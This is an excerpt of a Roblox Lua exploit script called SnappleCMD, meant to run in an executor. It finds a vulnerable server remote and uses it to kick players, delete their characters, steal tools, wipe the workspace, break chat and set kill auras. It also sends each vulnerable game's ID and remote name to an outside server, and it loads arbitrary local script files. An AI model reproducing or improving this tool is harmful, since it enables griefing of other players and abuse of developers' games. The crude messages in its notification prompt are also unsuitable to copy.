...
local function isElevatedStudioPlugin()
    local s = pcall(function() return coreGui:GetChildren() end)
    return s
end
...
local function rainbowColor(t, offset)
	offset = offset or 0
	return Color3.fromHSV((t * 0.5 + offset) % 1, 0.85, 1)
end

local quirkycmd = Instance.new("ScreenGui", gethui())
quirkycmd.Name = "snappleCMD"
...
remotepath.Text = ""
remotepath.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
...
remotepath.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
remotepath.BackgroundTransparency = 0.4
...
local remotepathStroke = Instance.new("UIStroke")
remotepathStroke.Name = "RainbowStroke"
remotepathStroke.Thickness = 2
remotepathStroke.Color = Color3.fromRGB(255, 0, 255)
remotepathStroke.Parent = remotepath

remotepath.Parent = quirkycmd

local cmdbox = Instance.new("TextBox")
cmdbox.Name = "cmdBox"
cmdbox.FontFace = Font.new("rbxasset://fonts/families/Code.json", Enum.FontWeight.Bold)
...
cmdbox.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
...
uicornerBox.Parent = cmdbox

local boxStroke = Instance.new("UIStroke")
boxStroke.Name = "RainbowStroke"
boxStroke.Thickness = 2
boxStroke.Color = Color3.fromRGB(255, 0, 255)
boxStroke.Parent = cmdbox

cmdbox.Parent = quirkycmd

local mobileopen = Instance.new("TextButton")
mobileopen.Name = "mobileOpen"
mobileopen.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
mobileopen.Text = "CMD"
mobileopen.TextColor3 = Color3.fromRGB(255, 255, 255)
mobileopen.TextScaled = true
mobileopen.TextSize = 14
mobileopen.TextWrapped = true
mobileopen.AnchorPoint = Vector2.new(1, 0)
mobileopen.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
...
mobileStroke.Name = "RainbowStroke"
mobileStroke.Thickness = 2
mobileStroke.Color = Color3.fromRGB(0, 255, 255)
mobileStroke.Parent = mobileopen
...
cmds.Name = "cmds"
cmds.Active = true
cmds.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
...
cmdsCorner.Parent = cmds

local cmdsStroke = Instance.new("UIStroke")
cmdsStroke.Name = "RainbowStroke"
cmdsStroke.Thickness = 2
cmdsStroke.Color = Color3.fromRGB(255, 0, 255)
cmdsStroke.Parent = cmds
...
cmdlist.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
...
cmdlistCorner.CornerRadius = UDim.new(0, 8)
cmdlistCorner.Parent = cmdlist

local template = Instance.new("TextLabel")
template.Name = "template"
template.FontFace = Font.new("rbxasset://fonts/families/Code.json", Enum.FontWeight.Bold)
template.Text = "error occured, dm snapple"
template.TextColor3 = Color3.fromRGB(220, 220, 220)
...
closeStroke.Name = "RainbowStroke"
...
local gui = quirkycmd or localPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("snappleCMD")
...
local function getGameList()
	if not isfile("snapple games.json") then
		writefile("snapple games.json", "[]") 
		return {} 
	end
	local content = readfile("snapple games.json")
...
local function sendGame()
	spawn(function()
		...
		res,err = pcall(function()
			httpget("https://eli.serv00.net/addgame.php?id=" .. tostring(game.PlaceId) .. "&remote=" .. genv.foundRemote.Name)
		end)
...
local function logGameLocally()
	...
	writefile("snapple games.json", game:GetService("HttpService"):JSONEncode(games))
	sendGame()
end
...
if not genv.foundRemote then
	...
	if not genv.foundRemote then scan(rStorage, true) end
	if not genv.foundRemote then scan(localPlayer:FindFirstChildOfClass("PlayerGui"), true) end
	if not genv.foundRemote then scan(workspace, true) end
	if not genv.foundRemote then scan(rStorage, false) end
	if not genv.foundRemote then scan(localPlayer:FindFirstChildOfClass("PlayerGui"), false) end
	if not genv.foundRemote then scan(workspace, false) end
	if not genv.foundRemote then
		for i,v in pairs(services) do scan(v, false) end
	end
end
...
if listfiles and hasFiles() then
	...
	if success and type(files) == "table" then
		for i,v in pairs(files) do
			...
			task.spawn(loadstring(readfile(v)))
		end
	end
end

-- ALL COMMANDS (unchanged logic, just renamed keys) --
addCommand("cmds", function() cmdsFrame.Visible = true end, {"commands"}, 3)
...
addCommand("ranks", function()
	...
	for name,level in pairs(privilegeLevels) do
		...
		printString ..= `{plr.DisplayName} - {rankNames[level]}\n`
	end
	print(printString)
end, {"admins", "owners"}, 3)

addCommand("aliases", function()
	local printString = "\nSnappleCMD command aliases:\n"
	for i,v in pairs(commands) do
...
addCommand("explorer", function()
	local function addTree(Instance)
		...
		Iris.SameLine() do
			if Iris.SmallButton({"Delete"}).clicked then delete(Instance) end
			if Iris.SmallButton({"Clear children"}).clicked then
				for i,v in pairs(Instance:GetChildren()) do delete(v) end
			end
			Iris.End()
		end
		if InstTree.state.isUncollapsed.value then
			for i,v in pairs(Instance:GetChildren()) do addTree(v) end
		end
		Iris.End()
	end
	Iris:Connect(function()
		Iris.Window({"SnappleCMD Explorer", [Iris.Args.Window.NoClose] = false}, {size = Iris.State(Vector2.new(200, 300)), position = Iris.State(Vector2.new(500, 75))}) do
			local priorityServices = {"Workspace", "Lighting", "Players", "ReplicatedStorage", "StarterPlayer", "StarterPack", "StarterGui"}
			for i,v in pairs(priorityServices) do addTree(game:GetService(v)) end
...
addCommand("btools", function()
	...
	if localPlayer.Backpack:FindFirstChild("snapple destroy tool") or (character and character:FindFirstChild("snapple destroy tool")) then return end
	local selection
	local destroyTool = Instance.new("Tool", localPlayer.Backpack)
	destroyTool.RequiresHandle = false
	destroyTool.CanBeDropped = false
	destroyTool.Name = "snapple destroy tool"
	...
	destroyTool.Equipped:Connect(function()
		...
		local selectionLoop = rs.Heartbeat:Connect(function()
	...
	unweldTool.Name = "snapple unweld tool"
...
addCommand("gun", function()
	...
	if localPlayer.Backpack:FindFirstChild("snapple gun tool") or (character:FindFirstChild("snapple gun tool")) then return end
	local gunTool = Instance.new("Tool", localPlayer.Backpack)
	gunTool.RequiresHandle = false
	gunTool.CanBeDropped = false
	gunTool.Name = "snapple gun tool"
	...
	gunTool.Unequipped:Connect(function() track:Stop() end)
end, {}, 3)
...
addCommand("punch", function()
	...
	if localPlayer.Backpack:FindFirstChild("snapple punch tool") or (character:FindFirstChild("snapple punch tool")) then return end
	local punchTool = Instance.new("Tool", localPlayer.Backpack)
	punchTool.RequiresHandle = false
	punchTool.CanBeDropped = false
	punchTool.Name = "snapple punch tool"
...
addCommand("unban", function(plrs, input)
	for i,v in pairs(bans) do
		if v == input or i == input then bans[i] = nil end
	end
end, {}, 2)

addCommand("kick", function(plrs)
	for i,v in pairs(plrs) do delete(v) end
end, {}, 2)
	...
	for i,v in pairs(plrs) do
		...
		local function rm()
			for i,v in pairs(char:GetDescendants()) do
				...
				if os then delete(os) task.wait(.1) end
...
addCommand("stealtools", function(plrs)
	...
	for i,plr in pairs(plrs) do
		...
		task.wait(0.05)
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then delete(humanoid) end
...
addCommand("clearstarter", function()
	...
	for i,v in pairs(sgui:GetChildren()) do delete(v) end
	for i,v in pairs(game:GetService("StarterPack"):GetChildren()) do delete(v) end
	...
	for i,v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts"):GetChildren()) do delete(v) end
end, {"clearstarters"}, 1)
...
addCommand("nochat",function()
	...
	for i,v in pairs(game:GetService("TextChatService"):GetChildren()) do delete(v) end
end, {"breakchat"}, 2)
...
addCommand("unlockws", function()
	for i,v in pairs(wslocks) do v:Disconnect() end
end, {}, 1)
...
addCommand("clearlighting",function()
	for i,v in pairs(game:GetService("Lighting"):GetChildren()) do delete(v) end
end, {}, 1)
...
addCommand("nuke",function() 
	for i,v in pairs(workspace:GetChildren()) do delete(v) end
	for i,v in pairs(players:GetPlayers()) do
		if i == 1 then continue end
		delete(v)
	end
...
addCommand("wither",function(plrs)
	...
	for i,v in pairs(plrs) do task.spawn(decay,v) end
end, {"decay"}, 1)
...
local function infectPlayer(plr)
	...
	local head = char:FindFirstChild("Head")
	if head then delete(head) task.wait(0.1) end
	for i,v in pairs(char:GetChildren()) do
		if not v:IsA("BasePart") then continue end
		delete(v)
	end
...
addCommand("killaura",function(plrs, input)
	...
	for i,v in pairs(plrs) do killauras[v.Name] = range end
end, {"aura"}, 1)

addCommand("unkillaura",function(plrs)
	for i,v in pairs(plrs) do killauras[v.Name] = nil end
end, {"unaura"}, 1)

addCommand("serverlock",function() slockEnabled = true end, {"slock"}, 2)
addCommand("unserverlock", function() slockEnabled = false end, {"unslock"}, 2)
...
addCommand("flyspeed",function(plrs, input) flySpeed = tonumber(input) or 50 end, {}, 3)
...
-- (reanim command unchanged except notify branding)
local function loadReanim()
	...
	local function align(part0, part1, offset)
		...
		if part0 and part0.Parent and part1 and part1.Parent then
			...
			if isnetworkowner(part0) then part0.CFrame = part1.CFrame * offset end
		end
	end
	local function setCamera(model)
		local oldCamCF = camera.CFrame
		camera.CameraSubject = model.Humanoid
		camera:GetPropertyChangedSignal("CFrame"):Once(function() camera.CFrame = oldCamCF end)
	end
	...
	local function onPostSim()
		for _, data in next, limbs do align(data[1], data[2],netlessCF) end
		for _, data in next, hatHandles do align(data[1], data[2], netlessCF) end
	end
	...
	reset.Event:Connect(function()
		...
		rig:Destroy()
		for i,v in pairs(reanimConnections) do v:Disconnect() end
	end)
...
--[[Rainbow scroll text]]--
local scrollText = "SnappleCMD made by aliensnapple | type cmds for a list of commands | "
if not isMobile then
	scrollText ..= "press ; to open/close command bar | "
end
local charCount = 12
local spaces = 0
local scrollSpeed = 0.12
...
--[[RAINBOW ANIMATION LOOP for all UIStrokes + accents]]--
task.spawn(function()
	local t = 0
	while quirkycmd.Parent do
		t += task.wait()
		local c1 = rainbowColor(t, 0)
		local c2 = rainbowColor(t, 0.25)
		local c3 = rainbowColor(t, 0.5)
		local c4 = rainbowColor(t, 0.75)

		if boxStroke then boxStroke.Color = c1 end
		if cmdsStroke then cmdsStroke.Color = c2 end
		if closeStroke then closeStroke.Color = c3 end
		if mobileStroke then mobileStroke.Color = c4 end
		if remotepathStroke then remotepathStroke.Color = c1 end

		if cmdbox then cmdbox.TextColor3 = c2 end
		if closebutton then closebutton.TextColor3 = c3 end
		if mobileopen then mobileopen.TextColor3 = c4 end

		for _, child in ipairs(cmdsList:GetChildren()) do
			if child:IsA("TextLabel") and child ~= cmdTemplate then
				child.TextColor3 = rainbowColor(t, (child.AbsolutePosition.X / 1000) % 1)
			end
		end
	end
end)
...
if not inDatabase then
	local function promptCallback(answer)
		...
		if not char then return end
		local part = char:FindFirstChildOfClass("Part") or char:FindFirstChildOfClass("Humanoid") 
		delete(part)
		task.wait(.5)
		if localPlayer.Character ~= char or part.Parent == char then return end 
		sendGame()
	...
	sgui:SetCore("SendNotification", {
		Title = "Game logger";
		Text = "snapple the most handsome guy",
		Duration = 300,
		Button1 = "yes papi",
		Button2 = "NEVER NOOB FACK U HAHA",
		Icon = "rbxassetid://82490397343155",
		Callback = bindable
	})
end

debugPrint("SnappleCMD initialized")
